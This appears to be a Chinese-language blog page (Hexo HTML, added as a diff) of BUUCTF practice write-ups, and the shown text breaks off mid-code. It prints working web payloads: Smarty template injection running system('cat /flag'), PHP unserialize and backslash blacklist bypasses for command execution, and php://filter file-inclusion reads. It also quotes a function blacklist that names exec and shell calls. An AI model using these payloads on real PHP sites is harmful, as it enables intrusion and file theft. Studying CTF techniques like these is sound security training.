@@ -1,0 +1,659 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="Hexo" href="http://odiws.github.io/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="Hexo" href="http://odiws.github.io/atom.xml" />
+<link rel="alternate" type="application/json" title="Hexo" href="http://odiws.github.io/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="buuctf" />
+
+
+<link rel="canonical" href="http://odiws.github.io/2024/04/29/5-txt/">
+
+
+
+  <title>
+buuctf4月29日 - 刷题笔记 |
+zty153’s_blog = Hexo</title>
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">buuctf4月29日
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="Created: 2024-04-29 22:48:35">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">Posted on</span>
+    <time itemprop="dateCreated datePublished" datetime="2024-04-29T22:48:35+08:00">2024-04-29</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="Toggle navigation bar">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">zty153’s_blog</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?868086"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?357122"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?859557"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?354284"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?87293"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?433750"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" itemprop="item" rel="index" title="In 刷题笔记"><span itemprop="name">刷题笔记</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
+  <link itemprop="mainEntityOfPage" href="http://odiws.github.io/2024/04/29/5-txt/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="odiws">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Hexo">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h2 id="bjdctf2020the-mystery-of-ip"><a class="anchor" href="#bjdctf2020the-mystery-of-ip">#</a> [BJDCTF2020]The mystery of ip</h2>
+<h3 id="image-20240428191224568"><a class="anchor" href="#image-20240428191224568">#</a> <img data-src="C:%5CUsers%5C86182%5CDesktop%5CmyBlog%5Cassets%5Cimage-20240428191224568.png" alt="image-20240428191224568" /></h3>
+<p>Flag 点进去看看，发现有个回显，是我的 ip 地址，着说明访问了我的 ip 地址，可以用伪造 IP 地址看看，这就想到用 X-Forwarded-For，可以看到不管我们输入什么都会回显，盲猜</p>
+<h3 id="ssti注入"><a class="anchor" href="#ssti注入">#</a> ssti 注入</h3>
+<h3 id="输入config看看配置是smarty"><a class="anchor" href="#输入config看看配置是smarty">#</a> 输入 {config} 看看配置，是 smarty</h3>
+<p><img data-src="C:%5CUsers%5C86182%5CDesktop%5CmyBlog%5Cassets%5Cimage-20240428191821870.png" alt="image-20240428191821870" /></p>
+<h3 id="看看版本smartyversion上网找它特点呗"><a class="anchor" href="#看看版本smartyversion上网找它特点呗">#</a> 看看版本 {$smarty.version}，上网找它特点呗</h3>
+<p><img data-src="C:%5CUsers%5C86182%5CDesktop%5CmyBlog%5Cassets%5Cimage-20240428191846842.png" alt="image-20240428191846842" /></p>
+<h3 id="也就是if是配对用的if和if且if内可以运行php代码"><a class="anchor" href="#也就是if是配对用的if和if且if内可以运行php代码">#</a> 也就是 if 是配对用的 if 和 /if，且 if 内可以运行 php 代码</h3>
+<p if="" system(“ls="" ”)="">{if system (“ls”)}{/if}, 这里的 flag.php 是假的，要查根目录下的</p>
+<p system(“ls”)="">{if system(“cat /flag”)}{/if}<br />
+ 还有一种表达就是直接</p>
+<p><img data-src="C:%5CUsers%5C86182%5CDesktop%5CmyBlog%5Cassets%5Cimage-20240428192441128.png" alt="image-20240428192441128" /></p>
+<h2 id="网鼎杯-2020-朱雀组phpweb-1"><a class="anchor" href="#网鼎杯-2020-朱雀组phpweb-1">#</a> [网鼎杯 2020 朱雀组] phpweb 1</h2>
+<p>1、打开界面之后界面一直在刷新，检查源代码也未发现提示信息，但是在检查中发现了两个隐藏的属性：func 和 p，抓包进行查看一下，结果如下：</p>
+<p><img data-src="https://img2022.cnblogs.com/blog/2834847/202208/2834847-20220830215742342-1296783573.png" alt="img" /></p>
+<p><img data-src="https://img2022.cnblogs.com/blog/2834847/202208/2834847-20220830215718355-978409354.png" alt="img" /></p>
+<p>2、对两个参数与返回值进行分析，我们使用 dat 时一般是这种格式：date (&quot;Y-m-d+h:i:s+a&quot;)，那我们可以猜测 func 参数接受的是一个函数，p 参数接受的是函数执行的内容，我们可以输入参数 md5 和 1 进行测试，结果如下：</p>
+<p><img data-src="https://img2022.cnblogs.com/blog/2834847/202208/2834847-20220830220636777-1328039962.png" alt="img" /></p>
+<p>3、那我们就尝试读取下当前的目录信息，payload：func=system&amp;p=ls，显示 hacking，应该是被过滤掉了，因此我们考虑读取下源码信息，payload：func=file_get_contents&amp;p=php://filter/read=convert.base64-encode/resource=index.php，对获得的字母串进行 base64 解码，结果如下：</p>
+<p><img data-src="https://img2022.cnblogs.com/blog/2834847/202208/2834847-20220830221155809-130862302.png" alt="img" /></p>
+<p><img data-src="https://img2022.cnblogs.com/blog/2834847/202208/2834847-20220830220820620-1733656961.png" alt="img" /></p>
+<p>源码如下：</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span>?php</pre></td></tr><tr><td data-num="2"></td><td><pre>    $disable_fun <span class="token operator">=</span> array<span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token string">"shell_exec"</span><span class="token punctuation">,</span><span class="token string">"system"</span><span class="token punctuation">,</span><span class="token string">"passthru"</span><span class="token punctuation">,</span><span class="token string">"proc_open"</span><span class="token punctuation">,</span><span class="token string">"show_source"</span><span class="token punctuation">,</span><span class="token string">"phpinfo"</span><span class="token punctuation">,</span><span class="token string">"popen"</span><span class="token punctuation">,</span><span class="token string">"dl"</span><span class="token punctuation">,</span><span class="token string">"eval"</span><span class="token punctuation">,</span><span class="token string">"proc_terminate"</span><span class="token punctuation">,</span><span class="token string">"touch"</span><span class="token punctuation">,</span><span class="token string">"escapeshellcmd"</span><span class="token punctuation">,</span><span class="token string">"escapeshellarg"</span><span class="token punctuation">,</span><span class="token string">"assert"</span><span class="token punctuation">,</span><span class="token string">"substr_replace"</span><span class="token punctuation">,</span><span class="token string">"call_user_func_array"</span><span class="token punctuation">,</span><span class="token string">"call_user_func"</span><span class="token punctuation">,</span><span class="token string">"array_filter"</span><span class="token punctuation">,</span> <span class="token string">"array_walk"</span><span class="token punctuation">,</span>  <span class="token string">"array_map"</span><span class="token punctuation">,</span><span class="token string">"registregister_shutdown_function"</span><span class="token punctuation">,</span><span class="token string">"register_tick_function"</span><span class="token punctuation">,</span><span class="token string">"filter_var"</span><span class="token punctuation">,</span> <span class="token string">"filter_var_array"</span><span class="token punctuation">,</span> <span class="token string">"uasort"</span><span class="token punctuation">,</span> <span class="token string">"uksort"</span><span class="token punctuation">,</span> <span class="token string">"array_reduce"</span><span class="token punctuation">,</span><span class="token string">"array_walk"</span><span class="token punctuation">,</span> <span class="token string">"array_walk_recursive"</span><span class="token punctuation">,</span><span class="token string">"pcntl_exec"</span><span class="token punctuation">,</span><span class="token string">"fopen"</span><span class="token punctuation">,</span><span class="token string">"fwrite"</span><span class="token punctuation">,</span><span class="token string">"file_put_contents"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    function gettime<span class="token punctuation">(</span>$func<span class="token punctuation">,</span> $p<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        $result <span class="token operator">=</span> call_user_func<span class="token punctuation">(</span>$func<span class="token punctuation">,</span> $p<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        $a<span class="token operator">=</span> gettype<span class="token punctuation">(</span>$result<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span>$a <span class="token operator">==</span> <span class="token string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>            <span class="token keyword">return</span> $result<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        var $p <span class="token operator">=</span> <span class="token string">"Y-m-d h:i:s a"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        var $func <span class="token operator">=</span> <span class="token string">"date"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        function __destruct<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>            <span class="token keyword">if</span> <span class="token punctuation">(</span>$this<span class="token operator">-</span><span class="token operator">></span>func <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>                echo gettime<span class="token punctuation">(</span>$this<span class="token operator">-</span><span class="token operator">></span>func<span class="token punctuation">,</span> $this<span class="token operator">-</span><span class="token operator">></span>p<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    $func <span class="token operator">=</span> $_REQUEST<span class="token punctuation">[</span><span class="token string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    $p <span class="token operator">=</span> $_REQUEST<span class="token punctuation">[</span><span class="token string">"p"</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>$func <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        $func <span class="token operator">=</span> strtolower<span class="token punctuation">(</span>$func<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span>!in_array<span class="token punctuation">(</span>$func<span class="token punctuation">,</span>$disable_fun<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>            echo gettime<span class="token punctuation">(</span>$func<span class="token punctuation">,</span> $p<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>            die<span class="token punctuation">(</span><span class="token string">"Hacker..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>?<span class="token operator">></span></pre></td></tr></table></figure><p>4、在代码里注意到了__destruct () 函数，此函数会在类被销毁时调用，那我们如果反序列化一个类，在类里的参数中写上我们要执行的代码和函数，这样的话就会直接调用 gettime 函数，而不会执行 in_array (<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>u</mi><mi>n</mi><mi>c</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">func,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">u</span><span class="mord mathnormal">n</span><span class="mord mathnormal">c</span><span class="mpunct">,</span></span></span></span>disable_fun)，那我们就绕过了黑名单的判断，payload：func=unserialize&amp;p=O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;} ，结果如下：</p>
+<p>序列化代码：</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span>?php</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    var $p <span class="token operator">=</span> <span class="token string">"ls"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    var $func <span class="token operator">=</span> <span class="token string">"system"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>$test <span class="token operator">=</span> new Test<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>$<span class="token builtin">str</span> <span class="token operator">=</span> serialize<span class="token punctuation">(</span>$test<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>$<span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>?<span class="token operator">></span></pre></td></tr></table></figure><p><img data-src="https://img2022.cnblogs.com/blog/2834847/202208/2834847-20220830223439037-1159865422.png" alt="img" /></p>
+<p>5、成功绕过黑名单获取到当前的目录信息，那我们就修改下传递的参数，查找下 flag 的位置信息，payload：func=unserialize&amp;p=O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:18:&quot;find+/+-name+flag*&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;} ，结果如下：</p>
+<p>序列化代码 (序列化之后注意将空格修改为 + 号，或者采用 get 方式进行传输）：</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span>?php</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    var $p <span class="token operator">=</span> <span class="token string">"find / -name flag*"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    var $func <span class="token operator">=</span> <span class="token string">"system"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>$test <span class="token operator">=</span> new Test<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>$<span class="token builtin">str</span> <span class="token operator">=</span> serialize<span class="token punctuation">(</span>$test<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>$<span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>?<span class="token operator">></span></pre></td></tr></table></figure><p><img data-src="https://img2022.cnblogs.com/blog/2834847/202208/2834847-20220830224529466-34088818.png" alt="img" /></p>
+<p>6、获得 flag 文件位置信息后，修改传递的参数读取下 flag 值，payload：func=unserialize&amp;p=O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:22:&quot;cat+/tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;} ，结果如下：</p>
+<p>序列化代码如下 (序列化之后注意将空格修改为 + 号，或者采用 get 方式进行传输）：</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span>?php</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    var $p <span class="token operator">=</span> <span class="token string">"cat /tmp/flagoefiu4r93"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    var $func <span class="token operator">=</span> <span class="token string">"system"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>$test <span class="token operator">=</span> new Test<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>$<span class="token builtin">str</span> <span class="token operator">=</span> serialize<span class="token punctuation">(</span>$test<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>$<span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>?<span class="token operator">></span></pre></td></tr></table></figure><p><img data-src="https://img2022.cnblogs.com/blog/2834847/202208/2834847-20220830224934681-1304625878.png" alt="img" /></p>
+<p>7、这里补充下另外一种绕过黑名单的方式，第三步中的读取目录信息，可以修改 payload：func=\system&amp;p=ls，也可以获得目录信息，结果如下；</p>
+<p><img data-src="https://img2022.cnblogs.com/blog/2834847/202208/2834847-20220830225414092-411832528.png" alt="img" /></p>
+<p>8、然后后面的就是查找 flag 文件的位置、读取 flag 信息，结果如下：</p>
+<p><img data-src="https://img2022.cnblogs.com/blog/2834847/202208/2834847-20220830230045055-616538494.png" alt="img" /></p>
+<p><img data-src="https://img2022.cnblogs.com/blog/2834847/202208/2834847-20220830225915975-872445652.png" alt="img" /></p>
+<p>9、\system 可以绕过黑名单的原因：php 内的 &quot;\&quot; 在做代码执行的时候，会识别特殊字符串。</p>
+<h2 id="bsidescf-2020had-a-bad-day"><a class="anchor" href="#bsidescf-2020had-a-bad-day">#</a> [BSidesCF 2020]Had a bad day</h2>
+<p><img data-src="C:%5CUsers%5C86182%5CDesktop%5CmyBlog%5Cassets%5Cimage-20240428194718770.png" alt="image-20240428194718770" /></p>
+<p>抓包发现是 get 的请求有个注入点，可以进行修改，但是发现只能写含有 woofers and meowers 的单词</p>
+<p><img data-src="C:%5CUsers%5C86182%5CDesktop%5CmyBlog%5Cassets%5Cimage-20240428194915353.png" alt="image-20240428194915353" /></p>
+<p>再次写 woofers.php 试试</p>
+<p><img data-src="C:%5CUsers%5C86182%5CDesktop%5CmyBlog%5Cassets%5Cimage-20240428195136220.png" alt="image-20240428195136220" /></p>
+<p>发现 php 双写了，就可以确定加了一个.php 文件</p>
+<p>后缀有.php 的可以想到 php 伪协议 php://filter/read=convert.base64-encode/resourse=index.php (这次将后缀删掉)</p>
+<p>获取源码：</p>
+<p>&lt;html&gt;</p>
+<p>&lt;head&gt;<br />
+&lt;meta charset=&quot;utf-8&quot;&gt;<br />
+&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;<br />
+&lt;meta name=&quot;description&quot; content=&quot;Images that spark joy&quot;&gt;<br />
+&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0&quot;&gt;<br />
+&lt;title&gt;Had a bad day?&lt;/title&gt;<br />
+&lt;link rel=&quot;stylesheet&quot; href=&quot;css/material.min.css&quot;&gt;<br />
+&lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;<br />
+&lt;/head&gt;</p>
+<p>&lt;body&gt;<br />
+&lt;div class=&quot;page-layout mdl-layout mdl-layout--fixed-header mdl-js-layout mdl-color--grey-100&quot;&gt;<br />
+&lt;header class=&quot;page-header mdl-layout__header mdl-layout__header--scroll mdl-color--grey-100 mdl-color-text--grey-800&quot;&gt;<br />
+&lt;div class=&quot;mdl-layout__header-row&quot;&gt;<br />
+&lt;span class=&quot;mdl-layout-title&quot;&gt;Had a bad day?&lt;/span&gt;<br />
+&lt;div class=&quot;mdl-layout-spacer&quot;&gt;&lt;/div&gt;<br />
+&lt;div&gt;<br />
+&lt;/header&gt;<br />
+&lt;div class=&quot;page-ribbon&quot;&gt;&lt;/div&gt;<br />
+&lt;main class=&quot;page-main mdl-layout__content&quot;&gt;<br />
+&lt;div class=&quot;page-container mdl-grid&quot;&gt;<br />
+&lt;div class=&quot;mdl-cell mdl-cell--2-col mdl-cell--hide-tablet mdl-cell--hide-phone&quot;&gt;&lt;/div&gt;<br />
+&lt;div class=&quot;page-content mdl-color--white mdl-shadow--4dp content mdl-color-text--grey-800 mdl-cell mdl-cell--8-col&quot;&gt;<br />
+&lt;div class=&quot;page-crumbs mdl-color-text--grey-500&quot;&gt;<br />
+&lt;/div&gt;<br />
+&lt;h3&gt;Cheer up!&lt;/h3&gt;<br />
+&lt;p&gt;<br />
+Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up!<br />
+&lt;/p&gt;<br />
+&lt;div class=&quot;page-include&quot;&gt;<br />
+&lt;?php<br />
+$file = $_GET['category'];</p>
+<pre><code>			if(isset($file))
+			&#123;
+				if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;
+					include ($file . '.php');
+				&#125;
+				else&#123;
+					echo &quot;Sorry, we currently only support woofers and meowers.&quot;;
+				&#125;
+			&#125;
+			?&gt;
+		&lt;/div&gt;
+      &lt;form action=&quot;index.php&quot; method=&quot;get&quot; id=&quot;choice&quot;&gt;
+          &lt;center&gt;&lt;button onclick=&quot;document.getElementById('choice').submit();&quot; name=&quot;category&quot; value=&quot;woofers&quot; class=&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded=&quot;,MaterialButton,MaterialRipple&quot;&gt;Woofers&lt;span class=&quot;mdl-button__ripple-container&quot;&gt;&lt;span class=&quot;mdl-ripple is-animating&quot; style=&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/button&gt;
+          &lt;button onclick=&quot;document.getElementById('choice').submit();&quot; name=&quot;category&quot; value=&quot;meowers&quot; class=&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded=&quot;,MaterialButton,MaterialRipple&quot;&gt;Meowers&lt;span class=&quot;mdl-button__ripple-container&quot;&gt;&lt;span class=&quot;mdl-ripple is-animating&quot; style=&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/button&gt;&lt;/center&gt;
+      &lt;/form&gt;
+
+      &lt;/div&gt;
+    &lt;/div&gt;
+  &lt;/main&gt;
+&lt;/div&gt;
+&lt;script src=&quot;js/material.min.js&quot;&gt;&lt;/script&gt;
+</code></pre>
+<p>&lt;/body&gt;<br />
+&lt;/html&gt;</p>
+<h3 id="php伪协议添加一个必须要的单词不会影响正常的包含"><a class="anchor" href="#php伪协议添加一个必须要的单词不会影响正常的包含">#</a> php 伪协议添加一个必须要的单词不会影响正常的包含</h3>
+<pre><code>php://filter/read=convert.base64-encode/woofers/resource=index
+</code></pre>
+<p>这样提交的参数既包含有 woofers 这个字符串，也不会影响正常的包含，得到 Flag.php：</p>
+<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1212355/202003/1212355-20200326212959322-1950812728.png"><img data-src="https://img2020.cnblogs.com/blog/1212355/202003/1212355-20200326212959322-1950812728.png" alt="img" /></a></p>
+<p>解码得到 Flag：</p>
+<pre><code>&lt;!-- Can you read this flag? --&gt;
+&lt;?php
+ // flag&#123;a4aaba40-84f9-4b7a-b269-d025b03676a1&#125;
+?&gt;
+</code></pre>
+<h2 id="bjdctf2020zjctf不过如此"><a class="anchor" href="#bjdctf2020zjctf不过如此">#</a> [BJDCTF2020] ZJCTF，不过如此</h2>
+<p>4 月 27 日的题目 [ZJCTF 2019] NiZhuanSiWei</p>
+<p>第二个 PHP 伪协议</p>
+<p>所有的</p>
+<p>?text=data://text/plain,I have a dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php</p>
+<p>解码后的代码</p>
+<p>&lt;?php<br />
+$id = <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mrow></mrow><mi>G</mi></msub><mi>E</mi><mi>T</mi><msup><mo stretchy="false">[</mo><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi>i</mi><msup><mi>d</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">]</mo><mo separator="true">;</mo></mrow><annotation encoding="application/x-tex">_GET[&#x27;id&#x27;];
